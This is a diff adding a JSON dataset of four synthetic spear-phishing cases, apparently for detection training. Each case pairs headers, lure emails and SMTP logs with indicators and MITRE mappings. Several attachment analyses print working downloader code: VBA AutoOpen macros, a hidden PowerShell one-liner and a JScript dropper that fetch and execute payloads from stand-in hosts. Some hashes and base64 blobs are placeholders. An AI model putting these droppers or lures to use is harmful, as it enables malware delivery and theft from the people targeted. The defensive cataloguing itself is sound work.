@@ -1,0 +1,181 @@
+{
+  "samples": [
+    {
+      "scenario": "Spear phishing email targeting HR manager with a malicious Word document attachment that exploits a macro vulnerability to deploy a keylogger. The attacker used information from a professional networking site to impersonate an external recruitment agency.",
+      "technical_data": {
+        "email_headers": "Return-Path: <recruiter@hiring-services.net>\r\nReceived: from mail.hiring-services.net (mail.hiring-services.net [203.0.113.45])\r\n\tby mail.hr.corp.local (Postfix) with ESMTPS id 9F4D1A7B2E\r\n\tfor <hrmanager@corp.local>; Wed, 7 Jun 2023 09:12:30 +0000 (UTC)\r\nReceived-SPF: pass (hiring-services.net: domain of recruiter@hiring-services.net designates 203.0.113.45 as permitted sender) client-ip=203.0.113.45;\r\nAuthentication-Results: mail.hr.corp.local; dkim=pass header.d=hiring-services.net; spf=pass smtp.mailfrom=recruiter@hiring-services.net; dmarc=pass\r\nMessage-ID: <CAF8a5Z7lJ9sR0eYzL2dT8+uM9kLbX@mail.hiring-services.net>\r\nDate: Wed, 7 Jun 2023 09:12:25 +0000\r\nFrom: \"Amanda Lee\" <recruiter@hiring-services.net>\r\nTo: \"Michael Brown\" <hrmanager@corp.local>\r\nSubject: Candidate Profile for Upcoming Position\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"===============0458392837482938475==\"\r\nX-Spam-Status: No, score=0.1 required=5.0 tests=DKIM_SIGNED,DKIM_VALID,SPF_PASS autolearn=ham autolearn_force=no version=3.4.2\r\n",
+        "email_body": "--===============0458392837482938475==\r\nContent-Type: text/plain; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nHello Michael,\r\n\r\nPlease find attached the profile of a promising candidate for the open Project Manager role.\r\nReview the document and let me know your thoughts.\r\n\r\nBest regards,\r\nAmanda\r\n\r\n--===============0458392837482938475==\r\nContent-Type: application/msword; name=\"Candidate_Profile.doc\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Candidate_Profile.doc\"\r\n\r\n0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAABQRQAUAQAAADQAAABDAwAAAAAAEAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAA==\r\n--===============0458392837482938475==--",
+        "smtp_transaction_log": "220 mail.hiring-services.net ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.hiring-services.net\r\n250-PIPELINING\r\n250-SIZE 20480000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<recruiter@hiring-services.net>\r\n250 2.1.0 Ok\r\nRCPT TO:<hrmanager@corp.local>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n<email data>\r\n.\r\n250 2.0.0 Ok: queued as 9F4D1A7B2E\r\nQUIT\r\n221 2.0.0 Bye\r\n",
+        "suspicious_domain_registration": {
+          "domain": "hiring-services.net",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-04-30T15:45:12Z",
+          "updated_date": "2023-05-02T12:30:00Z",
+          "registrant_country": "Ukraine",
+          "dns_servers": [
+            "ns1.fakehostdns.com",
+            "ns2.fakehostdns.com"
+          ],
+          "status": "clientTransferProhibited"
+        },
+        "url_in_email": "http://hiring-services.net/profile/view?id=1234",
+        "url_obfuscation": "Domain 'hiring-services.net' closely resembles legitimate recruitment services but was registered recently and uses HTTP instead of HTTPS to bypass some filters.",
+        "attachment_analysis": {
+          "filename": "Candidate_Profile.doc",
+          "file_type": "Microsoft Word 97-2003 Document",
+          "md5": "3a5f7c3b8bf54a2e9f6e0f8dc7a0f2c4",
+          "sha256": "7b9f2d2f4e7a3e4b8f2dd9f0a07b2e1a6e7b4c5d8f1a2b3c4d5e6f7a8b9c0d1e",
+          "embedded_macro": "AutoOpen macro executing VBA code to download and execute a remote payload from attacker-controlled server:\r\nSub AutoOpen()\r\n  Dim x As Object\r\n  Set x = CreateObject(\"MSXML2.XMLHTTP\")\r\n  x.Open \"GET\", \"http://203.0.113.45/malware.exe\", False\r\n  x.Send\r\n  If x.Status = 200 Then\r\n    Dim stream As Object\r\n    Set stream = CreateObject(\"ADODB.Stream\")\r\n    stream.Type = 1\r\n    stream.Open\r\n    stream.Write x.responseBody\r\n    stream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\r\n    stream.Close\r\n    Shell Environ(\"TEMP\") & \"\\payload.exe\", vbHide\r\n  End If\r\nEnd Sub",
+          "macro_code_snippet": "Sub AutoOpen()\r\n Dim x As Object\r\n Set x = CreateObject(\"MSXML2.XMLHTTP\")\r\n x.Open \"GET\", \"http://203.0.113.45/malware.exe\", False\r\n x.Send\r\n If x.Status = 200 Then\r\n   Dim stream As Object\r\n   Set stream = CreateObject(\"ADODB.Stream\")\r\n   stream.Type = 1\r\n   stream.Open\r\n   stream.Write x.responseBody\r\n   stream.SaveToFile Environ(\"TEMP\") & \"\\payload.exe\", 2\r\n   stream.Close\r\n   Shell Environ(\"TEMP\") & \"\\payload.exe\", vbHide\r\n End If\r\nEnd Sub"
+        }
+      },
+      "indicators": [
+        "Email From: recruiter@hiring-services.net (recently registered domain from Ukraine)",
+        "Attachment: Candidate_Profile.doc with embedded VBA macro",
+        "Macro downloads and executes payload from suspicious IP 203.0.113.45",
+        "Use of HTTP in URL and macro payload download",
+        "SPF pass but domain is newly registered and unrelated to known recruitment agencies",
+        "Email crafted using publicly available personal details from professional networks"
+      ],
+      "detection_method": "Email gateway sandboxing detecting macro-based downloader behavior, Endpoint detection monitoring Office applications spawning network connections and new processes, Domain reputation scoring flagging new domain with suspicious registrant, Network IDS detecting outbound HTTP connections to known malicious IP, User awareness training on verifying attachments from unknown recruiters.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1105 - Ingress Tool Transfer",
+        "T1059.005 - Command and Scripting Interpreter: Visual Basic",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Spear phishing email targeting IT administrator with a link to a fake internal portal login page designed to steal Active Directory credentials. The attacker used personal and organizational data to craft an email appearing to be from the company's IT security team about urgent password reset.",
+      "technical_data": {
+        "email_headers": "Return-Path: <security@corp-support.com>\r\nReceived: from mail.corp-support.com (mail.corp-support.com [198.51.100.89])\r\n\tby mail.itdept.corp.local (Postfix) with ESMTPS id 7D8E3C4F1A\r\n\tfor <itadmin@corp.local>; Thu, 8 Jun 2023 16:45:02 +0000 (UTC)\r\nReceived-SPF: pass (corp-support.com: domain of security@corp-support.com designates 198.51.100.89 as permitted sender) client-ip=198.51.100.89;\r\nAuthentication-Results: mail.itdept.corp.local; dkim=pass header.d=corp-support.com; spf=pass smtp.mailfrom=security@corp-support.com; dmarc=pass\r\nMessage-ID: <CAJ9m2+Xzq7bK4Um4M7x9=Q0v0T8@mail.corp-support.com>\r\nDate: Thu, 8 Jun 2023 16:45:00 +0000\r\nFrom: \"IT Security Team\" <security@corp-support.com>\r\nTo: \"Robert King\" <itadmin@corp.local>\r\nSubject: Immediate Action Required: Password Reset Portal Update\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=\"utf-8\"\r\nX-Spam-Status: No, score=0.2 required=5.0 tests=DKIM_SIGNED,DKIM_VALID,SPF_PASS autolearn=ham autolearn_force=no version=3.4.2\r\n",
+        "email_body": "<html><body>Dear Robert,<br><br>Due to recent security upgrades, all administrators are required to reset their passwords via the new secure portal.<br>Please <a href=\"http://corp-support.com/reset-password?user=robert.king\">click here</a> to proceed immediately.<br><br>Failure to comply within 24 hours may result in access suspension.<br><br>Regards,<br>IT Security Team</body></html>",
+        "smtp_transaction_log": "220 mail.corp-support.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.corp-support.com\r\n250-PIPELINING\r\n250-SIZE 5120000\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<security@corp-support.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<itadmin@corp.local>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n<email data>\r\n.\r\n250 2.0.0 Ok: queued as 7D8E3C4F1A\r\nQUIT\r\n221 2.0.0 Bye\r\n",
+        "suspicious_domain_registration": {
+          "domain": "corp-support.com",
+          "registrar": "NameSilo, LLC",
+          "creation_date": "2023-06-01T08:15:43Z",
+          "updated_date": "2023-06-01T08:15:43Z",
+          "registrant_country": "Belarus",
+          "dns_servers": [
+            "ns1.suspiciousdns.net",
+            "ns2.suspiciousdns.net"
+          ],
+          "status": "clientTransferProhibited"
+        },
+        "url_in_email": "http://corp-support.com/reset-password?user=robert.king",
+        "url_obfuscation": "Domain 'corp-support.com' is visually similar to official company support domain 'corp.com' but is a newly registered domain using HTTP instead of HTTPS to evade detection.",
+        "attachment_analysis": null
+      },
+      "indicators": [
+        "Email From: security@corp-support.com (new domain registered in Belarus)",
+        "Phishing link to fake password reset page mimicking internal portal",
+        "Use of HTTP instead of HTTPS in password reset link",
+        "Urgency and threat of access suspension to pressure recipient",
+        "SPF pass but domain unrelated to official corporate domains",
+        "Email personalized with recipient's name and position"
+      ],
+      "detection_method": "Email security gateway URL rewriting and sandboxing, Web proxy blocking access to suspicious domain, Endpoint detection monitoring for credential dumping or unusual authentication activity, Domain reputation and WHOIS monitoring flagging new suspicious domains, User training emphasizing verification of password reset requests via official channels.",
+      "relevant_mitre_techniques": [
+        "T1566.002 - Spearphishing Link",
+        "T1078 - Valid Accounts",
+        "T1204.002 - User Execution: Malicious File (if payload downloaded)",
+        "T1539 - Steal Web Session Cookie",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Spear phishing email targeting HR manager with a malicious Word document attachment exploiting a macro to install keylogger malware. The attacker gathered details from the company website and LinkedIn profiles to impersonate the Head of HR and request urgent review of new employee contracts.",
+      "technical_data": {
+        "email_headers": "Return-Path: <headofhr@contoso-hrcorp.com>\r\nReceived: from mail.contoso-hrcorp.com (mail.contoso-hrcorp.com [203.0.113.45])\r\n\tby mail.hr.corp.local (Postfix) with ESMTPS id 9F4D2A1B8C\r\n\tfor <hrmanager@corp.local>; Wed, 07 Jun 2023 09:15:42 +0000 (UTC)\r\nReceived-SPF: pass (contoso-hrcorp.com: domain of headofhr@contoso-hrcorp.com designates 203.0.113.45 as permitted sender) client-ip=203.0.113.45;\r\nAuthentication-Results: mail.hr.corp.local; dkim=pass header.d=contoso-hrcorp.com; spf=pass smtp.mailfrom=headofhr@contoso-hrcorp.com; dmarc=pass\r\nMessage-ID: <CAM1z5b3F9hXjD8R=8a5bL9a_T3pXOZ@mail.contoso-hrcorp.com>\r\nDate: Wed, 7 Jun 2023 09:15:38 +0000\r\nFrom: \"Linda K. Turner\" <headofhr@contoso-hrcorp.com>\r\nTo: \"Mark Wilson\" <hrmanager@corp.local>\r\nSubject: Immediate Review Required: New Employee Contracts\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_NextPart_000_0012_01D9E3B4.5F3B6EA0\"\r\nX-Spam-Status: No, score=0.1 required=5.0 tests=DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,SPF_PASS autolearn=ham autolearn_force=no version=3.4.2\r\nX-MS-Exchange-Organization-AuthSource: mail.contoso-hrcorp.com\r\nX-MS-Exchange-Organization-AuthAs: Internal\r\n",
+        "email_body": "------=_NextPart_000_0012_01D9E3B4.5F3B6EA0\r\nContent-Type: text/plain; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nHi Mark,\r\n\r\nPlease find attached the updated contracts for our new employees. Kindly review and sign them by EOD.\r\n\r\nThanks,\r\nLinda\r\n\r\n------=_NextPart_000_0012_01D9E3B4.5F3B6EA0\r\nContent-Type: application/msword; name=\"Employee_Contracts.docm\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Employee_Contracts.docm\"\r\n\r\nTVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBw\r\ncm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAAEAAAEAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\r\n------=_NextPart_000_0012_01D9E3B4.5F3B6EA0--",
+        "smtp_transaction_log": "220 mail.contoso-hrcorp.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.contoso-hrcorp.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<headofhr@contoso-hrcorp.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<hrmanager@corp.local>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n<email data>\r\n.\r\n250 2.0.0 Ok: queued as 9F4D2A1B8C\r\nQUIT\r\n221 2.0.0 Bye\r\n",
+        "suspicious_domain_registration": {
+          "domain": "contoso-hrcorp.com",
+          "registrar": "GoDaddy.com, LLC",
+          "creation_date": "2023-05-30T15:40:12Z",
+          "updated_date": "2023-05-30T15:40:12Z",
+          "registrant_country": "China",
+          "dns_servers": [
+            "ns1.fake-dns-hr.com",
+            "ns2.fake-dns-hr.com"
+          ],
+          "status": "clientTransferProhibited"
+        },
+        "url_in_email": "http://contoso-hrcorp.com/contracts/review?id=4567",
+        "url_obfuscation": "The domain 'contoso-hrcorp.com' closely resembles the legitimate 'contoso-hr.com' by appending '-corp' to create confusion. The URL uses HTTP instead of HTTPS, which is unusual for HR portals.",
+        "attachment_analysis": {
+          "filename": "Employee_Contracts.docm",
+          "file_type": "Microsoft Word Macro-Enabled Document",
+          "md5": "8f14e45fceea167a5a36dedd4bea2543",
+          "sha256": "d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2",
+          "embedded_macro": "AutoOpen macro triggers download and execution of keylogger from remote server:\r\npowershell -windowstyle hidden -command \"Invoke-WebRequest http://203.0.113.77/kl.exe -OutFile $env:TEMP\\kl.exe; Start-Process $env:TEMP\\kl.exe\"",
+          "macro_code_snippet": "Sub AutoOpen()\r\n Dim shell As Object\r\n Set shell = CreateObject(\"WScript.Shell\")\r\n shell.Run \"powershell -windowstyle hidden -command \\\"Invoke-WebRequest http://203.0.113.77/kl.exe -OutFile $env:TEMP\\\\kl.exe; Start-Process $env:TEMP\\\\kl.exe\\\"\"\r\nEnd Sub"
+        }
+      },
+      "indicators": [
+        "Email From: headofhr@contoso-hrcorp.com (spoofed, newly registered domain from China)",
+        "Attachment: Employee_Contracts.docm with AutoOpen macro",
+        "Macro downloads and executes keylogger binary from suspicious IP",
+        "Use of HTTP instead of HTTPS in link and download URL",
+        "SPF pass but domain unrelated to official HR domain",
+        "Email text uses terms aligned with company HR language to target recipient"
+      ],
+      "detection_method": "Email gateway sandboxing reveals macro attempting to download and execute external payload, Endpoint protection flags suspicious PowerShell invocation from Word process, Domain reputation systems flag new domain with foreign registrant, Network IDS detects HTTP download from uncommon IP address, User training to verify unexpected contract requests.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1059.001 - PowerShell",
+        "T1105 - Ingress Tool Transfer",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Spear phishing email targeting IT administrator with a malicious ZIP archive containing a JavaScript file that downloads and runs a backdoor. The attacker used leaked internal employee directories and social media to impersonate the IT Director and request urgent patch updates.",
+      "technical_data": {
+        "email_headers": "Return-Path: <itdirector@contoso-itservices.com>\r\nReceived: from mail.contoso-itservices.com (mail.contoso-itservices.com [198.51.100.128])\r\n\tby mail.it.corp.local (Postfix) with ESMTPS id 7B5C1D2F9E\r\n\tfor <itadmin@corp.local>; Thu, 08 Jun 2023 12:47:33 +0000 (UTC)\r\nReceived-SPF: pass (contoso-itservices.com: domain of itdirector@contoso-itservices.com designates 198.51.100.128 as permitted sender) client-ip=198.51.100.128;\r\nAuthentication-Results: mail.it.corp.local; dkim=pass header.d=contoso-itservices.com; spf=pass smtp.mailfrom=itdirector@contoso-itservices.com; dmarc=pass\r\nMessage-ID: <CAB7xz9aOP1Jq8YRzXoLq5pXvP6@mail.contoso-itservices.com>\r\nDate: Thu, 8 Jun 2023 12:47:28 +0000\r\nFrom: \"Michael D. Roberts\" <itdirector@contoso-itservices.com>\r\nTo: \"Alice Chen\" <itadmin@corp.local>\r\nSubject: Critical Security Patch - Immediate Action Required\r\nMIME-Version: 1.0\r\nContent-Type: multipart/mixed; boundary=\"----=_Part_000_0023_01D9E5C8.6A7B1F40\"\r\nX-Spam-Status: No, score=0.2 required=5.0 tests=DKIM_SIGNED,DKIM_VALID,SPF_PASS autolearn=ham version=3.4.2\r\nX-MS-Exchange-Organization-AuthSource: mail.contoso-itservices.com\r\nX-MS-Exchange-Organization-AuthAs: Internal\r\n",
+        "email_body": "------=_Part_000_0023_01D9E5C8.6A7B1F40\r\nContent-Type: text/plain; charset=\"utf-8\"\r\nContent-Transfer-Encoding: quoted-printable\r\n\r\nHi Alice,\r\n\r\nPlease find attached the latest security patch released by our vendor. Deploy it immediately to all critical servers.\r\n\r\nRegards,\r\nMichael\r\n\r\n------=_Part_000_0023_01D9E5C8.6A7B1F40\r\nContent-Type: application/zip; name=\"Patch_Update.zip\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"Patch_Update.zip\"\r\n\r\nUEsDBBQAAAAIAAeLb1QAAAAAAAAAAAAAAAAHAAAAdXBkYXRlLmpzCkZ1bmN0aW9uIGRvbmxvYWRQ\r\nYXRoKCkgewogICAgdmFyIGh0dHBDbGllbnQgPSBuZXcgQXhpb1VSTCgpOwogICAgaHR0cENsaWVu\r\ndC5vcGVuKAogICAgICAiaHR0cDovL2F0dGVjay5leGFtcGxlLmNvbS9wYXRoL3VwZGF0ZS5leGUi\r\nLAogICAgICBmdW5jdGlvbigpIHsogICAgICAgIGh0dHBDbGllbnQucmVzcG9uc2VUaGVuKHVuaXRl\r\nKGV4dGVybmFsKSk7CiAgICB9LAogICAgICJHRVQiCiAgICk7CiAgICBodHRwQ2xpZW50Lm9uZXJl\r\ncnJvcj0gZnVuY3Rpb24oZSkgewogICAgICAgIGNvbnNvbGUubG9nKCJFcnJvciBkb3dubG9hZGlu\r\nZyB1cGRhdGU6ICIgKyBlLmluZm9ybWF0aW9uKTsKICAgIH07Cn0KZG9ubG9hZFBhdGgoKTsKUEsB\r\nBQAAAAIAAeLb1QAAAAAAAAAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAAB1cGRhdGUuanNQSwUGAAAA\r\nAAQABADiAAAAYQAAAAAA\r\n------=_Part_000_0023_01D9E5C8.6A7B1F40--",
+        "smtp_transaction_log": "220 mail.contoso-itservices.com ESMTP Postfix\r\nEHLO attacker-host.example\r\n250-mail.contoso-itservices.com\r\n250-PIPELINING\r\n250-SIZE 10485760\r\n250-VRFY\r\n250-ETRN\r\n250-STARTTLS\r\n250-AUTH PLAIN LOGIN\r\n250-ENHANCEDSTATUSCODES\r\n250-8BITMIME\r\n250 DSN\r\nMAIL FROM:<itdirector@contoso-itservices.com>\r\n250 2.1.0 Ok\r\nRCPT TO:<itadmin@corp.local>\r\n250 2.1.5 Ok\r\nDATA\r\n354 End data with <CR><LF>.<CR><LF>\r\n<email data>\r\n.\r\n250 2.0.0 Ok: queued as 7B5C1D2F9E\r\nQUIT\r\n221 2.0.0 Bye\r\n",
+        "suspicious_domain_registration": {
+          "domain": "contoso-itservices.com",
+          "registrar": "NameSilo, LLC",
+          "creation_date": "2023-06-01T07:14:30Z",
+          "updated_date": "2023-06-01T07:14:30Z",
+          "registrant_country": "Ukraine",
+          "dns_servers": [
+            "ns1.fake-dns-it.com",
+            "ns2.fake-dns-it.com"
+          ],
+          "status": "clientTransferProhibited"
+        },
+        "url_in_email": "http://contoso-itservices.com/patch/download?id=9988",
+        "url_obfuscation": "The domain 'contoso-itservices.com' visually imitates the legitimate 'contoso-it.com' with an added 'services' segment, aiming to mislead recipients. The URL uses HTTP instead of the expected HTTPS.",
+        "attachment_analysis": {
+          "filename": "Patch_Update.zip",
+          "file_type": "ZIP archive containing JavaScript file",
+          "md5": "b026324c6904b2a9cb4b88d6d61c81d1",
+          "sha256": "a7f5f35426b927411fc9231b56382173b8a9d4e4be4f9b2c1a2a3a1f6b3f7e4c",
+          "embedded_macro": "JavaScript file 'update.js' that uses XMLHttpRequest to silently download and execute backdoor executable from attacker's server.",
+          "macro_code_snippet": "function downloadPatch() {\n  var httpClient = new XMLHttpRequest();\n  httpClient.open(\"GET\", \"http://attack.example.com/patch/update.exe\", false);\n  httpClient.send(null);\n  if (httpClient.status === 200) {\n    var shell = new ActiveXObject(\"WScript.Shell\");\n    var fso = new ActiveXObject(\"Scripting.FileSystemObject\");\n    var tempPath = fso.GetSpecialFolder(2) + \"\\\\update.exe\";\n    var stream = new ActiveXObject(\"ADODB.Stream\");\n    stream.Type = 1;\n    stream.Open();\n    stream.Write(httpClient.responseBody);\n    stream.SaveToFile(tempPath, 2);\n    stream.Close();\n    shell.Run(tempPath, 0, false);\n  }\n}\ndownloadPatch();"
+        }
+      },
+      "indicators": [
+        "Email From: itdirector@contoso-itservices.com (spoofed, suspicious new domain from Ukraine)",
+        "Attachment: Patch_Update.zip containing malicious JavaScript file",
+        "JavaScript silently downloads and executes backdoor executable",
+        "Use of HTTP instead of HTTPS in download URL and embedded script",
+        "SPF pass but domain unrelated to official IT domain",
+        "Email content uses urgency and technical language to pressure recipient"
+      ],
+      "detection_method": "Email sandboxing identifies JavaScript attempting network connections and file execution, Endpoint protection alerts on script execution with ActiveXObject usage, Domain reputation flagged due to recent registration from suspicious country, Network IDS detects unusual HTTP downloads to external IP, Security awareness training for verifying patch requests from trusted channels.",
+      "relevant_mitre_techniques": [
+        "T1566.001 - Spearphishing Attachment",
+        "T1204.002 - User Execution: Malicious File",
+        "T1105 - Ingress Tool Transfer",
+        "T1059.007 - JavaScript",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    }
+  ]
+}
